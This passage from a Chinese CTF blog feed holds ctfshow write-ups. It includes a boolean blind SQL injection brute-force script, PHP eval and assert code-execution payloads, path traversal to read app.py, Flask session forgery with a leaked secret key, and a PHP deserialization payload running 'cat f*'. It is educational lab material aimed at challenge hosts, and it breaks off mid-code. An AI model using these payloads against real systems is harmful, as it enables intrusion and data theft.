alt="image-20230316220846375"></p><p>经过测试，我们发现用户名为：<code>admin</code>，并且只有用户名这里有注入点，</p><p>当用户名正确时，回显：<code>密码错误</code>。当用户名错误时，回显：<code>用户名/密码错误</code></p><p>很明显这里需要使用 <code>布尔盲注</code></p><p>我们先使用 <code>fuzz</code>看一下过滤了哪些字符：</p><p><img src="https://s2.loli.net/2023/03/16/DM64iaS9JY7zBWQ.png" alt="image-20230316221433875"></p><p>发现：<code>or、select、union</code>等被过滤了</p><p>但是：<code>&lt;、（）、substr、length、||</code> 没有被过滤，我们可以使用 <code>||</code> 去代替<code>or</code></p><p>这里注入需查询的方式和以往不同，这里只需要查询出<code>admin</code>的密码即可</p><p>用户名<code>admin</code>的密码字段为：<code>p</code></p><p>我们首先使用<code>length</code>查询出密码的长度</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;||length(p)&lt;&#x27;<span class="hljs-number">17</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/16/Rkr3I4ydHLwjiWm.png" alt="image-20230316222410754"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;||length(p)&lt;&#x27;<span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/16/MytNKJ87pVlihFr.png" alt="image-20230316222622646"></p><p>此时说明密码长度为 17位</p><p>接下来我们需要使用脚本去获得密码了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://97da0123-c533-4807-aca1-35bcc7f088a9.challenge.ctf.show/admin/checklogin.php&quot;</span><br>letter=<span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">18</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> letter:<br>        payload=<span class="hljs-string">&quot;&#x27;||substr(p,&#123;&#125;,1)&lt;&#x27;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<br>        <span class="hljs-comment">#print(payload)</span><br>        data=&#123;<br>            <span class="hljs-string">&#x27;u&#x27;</span>:payload,<br>            <span class="hljs-string">&#x27;p&#x27;</span>:<span class="hljs-number">1</span><br>            &#125;<br>        res=requests.post(url=url,data=data).text<br>        <span class="hljs-built_in">print</span>(res)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;密码错误&quot;</span> == res:<br>            flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(j)-<span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>然后登录得到flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow_萌新赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow_菜狗杯</title>
    <link href="/2023/08/24/ctfshow_%E8%8F%9C%E7%8B%97%E6%9D%AF/"/>
    <url>/2023/08/24/ctfshow_%E8%8F%9C%E7%8B%97%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;CTFshow-QQ群:&#x27;</span>]]]][<span class="hljs-number">6</span>][<span class="hljs-number">0</span>][<span class="hljs-number">7</span>][<span class="hljs-number">5</span>][<span class="hljs-number">8</span>][<span class="hljs-number">0</span>][<span class="hljs-number">9</span>][<span class="hljs-number">4</span>][<span class="hljs-number">4</span>]);<br></code></pre></td></tr></table></figure><p>仔细观察题目，这题就是套娃，</p><p>首先我们需要传个cookie，名为 <code>CTFshow-QQ群:</code> 但是一直不起作用，</p><p>我们需要将它进行url编码，此处值为：<code>a</code></p><p><code>$_POST[a]=b</code> -&gt; <code>$_GET[b]=c</code> -&gt;</p><p> <code>$_REQUEST[c][6][0][7][5][8][0][9][4][4]=system(&#39;ls&#39;);</code></p><p>注意：c应该传一个数组</p><h3 id="web2-c0me-t0-s1gn"><a href="#web2-c0me-t0-s1gn" class="headerlink" title="web2 c0me_t0_s1gn"></a>web2 c0me_t0_s1gn</h3><p>源码有前一半flag，控制台有另一半</p><h3 id="我的眼里只有"><a href="#我的眼里只有" class="headerlink" title="我的眼里只有$"></a>我的眼里只有$</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>这是一个php变量覆盖题，要弄好多层，自己敲很麻烦，我们应该写个python脚本</p><p>总共36个$。这里有一个<code>extract()</code> 函数：</p><p><img src="https://s2.loli.net/2023/03/06/QxBaVptL1gET95M.png" alt="image-20230306112022365"></p><p>这个函数可以将此处<code>$_POST</code> 数组中的键名赋值为变量，我们只需要在post中传参即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><br>code = <span class="hljs-string">&quot;assert($_GET[1]);&quot;</span><br>s = string.ascii_letters  <span class="hljs-comment"># 获取所有大小写英文字母</span><br><br>post = <span class="hljs-string">&quot;_=a&amp;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">34</span>):<br>    post += s[i] + <span class="hljs-string">&quot;=&quot;</span> + s[i+<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;&amp;&quot;</span><br><br>post += s[i+<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;=&quot;</span> + code<br><span class="hljs-built_in">print</span>(post)<br><br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">_=a<span class="hljs-variable">&amp;a</span>=b<span class="hljs-variable">&amp;b</span>=c<span class="hljs-variable">&amp;c</span>=d<span class="hljs-variable">&amp;d</span>=e<span class="hljs-variable">&amp;e</span>=f<span class="hljs-variable">&amp;f</span>=g<span class="hljs-variable">&amp;g</span>=h<span class="hljs-variable">&amp;h</span>=i<span class="hljs-variable">&amp;i</span>=j<span class="hljs-variable">&amp;j</span>=k<span class="hljs-variable">&amp;k</span>=l<span class="hljs-variable">&amp;l</span>=m<span class="hljs-variable">&amp;m</span>=n<span class="hljs-variable">&amp;n</span>=o<span class="hljs-variable">&amp;o</span>=p<span class="hljs-variable">&amp;p</span>=q<span class="hljs-variable">&amp;q</span>=r<span class="hljs-variable">&amp;r</span>=s<span class="hljs-variable">&amp;s</span>=t<span class="hljs-variable">&amp;t</span>=u<span class="hljs-variable">&amp;u</span>=v<span class="hljs-variable">&amp;v</span>=w<span class="hljs-variable">&amp;w</span>=x<span class="hljs-variable">&amp;x</span>=y<span class="hljs-variable">&amp;y</span>=z<span class="hljs-variable">&amp;z</span>=A<span class="hljs-variable">&amp;</span>A=B<span class="hljs-variable">&amp;</span>B=C<span class="hljs-variable">&amp;</span>C=D<span class="hljs-variable">&amp;</span>D=E<span class="hljs-variable">&amp;</span>E=F<span class="hljs-variable">&amp;</span>F=G<span class="hljs-variable">&amp;</span>G=H<span class="hljs-variable">&amp;</span>H=I<span class="hljs-variable">&amp;</span>I=assert($_GET[<span class="hljs-number">1</span>])<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure><p>我们只需要使用get传参，命令执行即可</p><h3 id="抽老婆"><a href="#抽老婆" class="headerlink" title="抽老婆"></a>抽老婆</h3><p>打开页面发现一个下载的按钮，点击后可以下载图片</p><p><img src="https://s2.loli.net/2023/03/06/tx3zROkN5Fgfb6l.png" alt="image-20230306113940399"></p><p><code>url:</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">3</span>cef0567-fe4d-<span class="hljs-number">413</span>d-<span class="hljs-number">911</span>e-ebf363d7fda8.challenge.ctf.show/download?file=<span class="hljs-number">0</span>df74e7fc6614180ee892683f13d5abf.jpg<br></code></pre></td></tr></table></figure><p>这里好像存在任意文件下载漏洞，我们随便输入一个路径：</p><p><img src="https://s2.loli.net/2023/03/06/nXkE91vTNVF63cY.png" alt="image-20230306113847191"></p><p>我们发现这个是 python的 flask框架，于是我们想要去读取 &#x2F;app&#x2F;app.py文件，</p><p>使用相对路径成功读取</p><p><img src="https://s2.loli.net/2023/03/06/kWGmnPQgMocsF41.png" alt="image-20230306114101898"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># !/usr/bin/env python</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"># File       : app.py</span><br><span class="hljs-string"># Time       ：2022/11/07 09:16</span><br><span class="hljs-string"># Author     ：g4_simon</span><br><span class="hljs-string"># version    ：python 3.9.7</span><br><span class="hljs-string"># Description：抽老婆，哇偶~</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-comment">#初始化全局变量</span><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;tanji_is_A_boy_Yooooooooooooooooooooo!&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():  <br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/getwifi&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getwifi</span>():<br>    session[<span class="hljs-string">&#x27;isadmin&#x27;</span>]=<span class="hljs-literal">False</span><br>    wifi=random.choice(os.listdir(<span class="hljs-string">&#x27;static/img&#x27;</span>))<br>    session[<span class="hljs-string">&#x27;current_wifi&#x27;</span>]=wifi<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;getwifi.html&#x27;</span>,wifi=wifi)<br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/download&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>(): <br>    filename=request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> filename:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;你想干什么？&quot;</span>&#125;)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;static/img/&#x27;</span>+filename,as_attachment=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/secret_path_U_never_know&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getflag</span>():<br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;isadmin&#x27;</span>]:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;msg&quot;</span>:flag&#125;)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;你怎么知道这个路径的？不过还好我有身份验证&quot;</span>&#125;)<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>分析一下，这题考点就是 <code>flask session伪造</code> ，只需要把 <code>session[&#39;isadmin&#39;]</code> 改为true即可。</p><p>但是session伪造需要key，这里也给出了：<code>tanji_is_A_boy_Yooooooooooooooooooooo!</code></p><p>于是我们可以使用脚本伪造cookie：</p><p><img src="https://s2.loli.net/2023/03/06/kvBz9sfjlCmMFVG.png" alt="image-20230306114542730"></p><p>我们将 <code>isadmin</code>改为True，然后再加密：</p><p><img src="https://s2.loli.net/2023/03/06/DzpGkZeBmnbAtaM.png" alt="image-20230306114941255"></p><p>该一下session访问路径得到flag</p><h3 id="一言既出"><a href="#一言既出" class="headerlink" title="一言既出"></a>一言既出</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;  <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>] == <span class="hljs-number">114514</span>)&#123;<br>        <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;intval(<span class="hljs-subst">$_GET</span>[num])==1919810&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;一言既出，驷马难追!&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>很简单，payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?num=<span class="hljs-number">114514</span>-<span class="hljs-number">114514</span>+<span class="hljs-number">1919810</span>  <span class="hljs-regexp">//</span>注意+需要url编码为：%<span class="hljs-number">2</span>B,否则会被解析为空格<br></code></pre></td></tr></table></figure><p>这里考察php弱比较，以及 intval()函数</p><p>官方wp，由于这里使用 assert()函数，可以将字符串当作代码执行，所以我们可以去闭合括号：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?n</span>um=);%<span class="hljs-number">23</span>               使用<span class="hljs-comment">#注释掉后面</span><br></code></pre></td></tr></table></figure><h3 id="驷马难追"><a href="#驷马难追" class="headerlink" title="驷马难追"></a>驷马难追</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;  <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>] == <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>              <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;intval(<span class="hljs-subst">$_GET</span>[num])==1919810&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;一言既出，驷马难追!&quot;</span>);<br>              <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>     &#125; <br>&#125; <br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]|\;|\(|\)/&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>使用运算符绕过即可</p><h3 id="TapTapTap"><a href="#TapTapTap" class="headerlink" title="TapTapTap"></a>TapTapTap</h3><p>一个js小游戏题，直接找js源码：</p><p><img src="https://s2.loli.net/2023/03/06/mwB2A1gLIqiYJrM.png" alt="image-20230306125703411"></p><p>找到一串可疑代码，我们在控制台执行：</p><p><img src="https://s2.loli.net/2023/03/06/cFdXVQj8wKTAszY.png" alt="image-20230306125637870"></p><p>该路径存在flag</p><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Webshell</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;echo &quot;Hello World!&quot;&#x27;</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">init</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;cmd)) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exec</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$serializecmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>        <span class="hljs-variable">$unserializecmd</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serializecmd</span>);<br>        <span class="hljs-variable">$unserializecmd</span>-&gt;<span class="hljs-title function_ invoke__">init</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>一个简单的php反序列化</p><p>直接构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Webshell</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;cat f*&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Webshell</span>()));<br><br>输出：<br>O%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Webshell%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cmd%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cat+f%<span class="hljs-number">2</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><h3 id="化零为整"><a href="#化零为整" class="headerlink" title="化零为整"></a>化零为整</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-variable">$result</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$_GET</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$i</span>])&gt;<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你太长了！！&quot;</span>);<br>        &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$result</span>=<span class="hljs-variable">$result</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> ===<span class="hljs-string">&quot;大牛&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这题的意思是我们get传参数据长度为1，并且拼接后得到 <code>大牛</code></p><p>如何实现呢？我之前想到的是unicode编码之类的，但是此处可以使用url编码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-string">&quot;大牛&quot;</span>);<br><br>输出：<br>%E5%A4%A7%E7%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>B<br></code></pre></td></tr></table></figure><p>然后get传参：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?<span class="hljs-number">1</span>=<span class="hljs-meta">%</span>E<span class="hljs-number">5</span>&amp;<span class="hljs-number">2</span>=<span class="hljs-meta">%</span>A<span class="hljs-number">4</span>&amp;<span class="hljs-number">3</span>=<span class="hljs-meta">%</span>A<span class="hljs-number">7</span>&amp;<span class="hljs-number">4</span>=<span class="hljs-meta">%</span>E<span class="hljs-number">7</span>&amp;<span class="hljs-number">5</span>=<span class="hljs-meta">%</span><span class="hljs-number">89</span>&amp;<span class="hljs-number">6</span>=<span class="hljs-meta">%</span><span class="hljs-number">9</span>B<br></code></pre></td></tr></table></figure><h3 id="无一幸免"><a href="#无一幸免" class="headerlink" title="无一幸免"></a>无一幸免</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 